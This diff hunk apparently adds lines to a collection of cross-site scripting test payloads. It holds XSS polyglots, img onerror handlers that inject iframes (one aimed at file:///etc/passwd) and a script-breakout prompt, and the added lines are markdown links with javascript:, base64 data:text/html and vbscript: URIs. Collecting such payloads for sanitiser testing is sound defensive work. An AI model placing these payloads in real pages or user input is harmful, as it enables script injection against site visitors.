@@ -40,6 +40,10 @@ jaVasCript:/*--></title></style></textarea></script></xmp><svg/onload=alert(1)>
 <img src="invalid" onerror="document.body.innerHTML+='<iframe src=https://emupedia.net/emupedia-game-doom1/asmjs/ width=500 height=400></iframe>'">
 <img src="echopwn" onerror​="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
 1'});});<​/script><​script>prompt("HACKED BY \ted")<​/script>
+[Click](javascript:alert('XSS'))
+![Img](javascript:alert(1))
+[Link](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=)
+[Hover](vbscript:msgbox('XSS'))
 
 
 ```
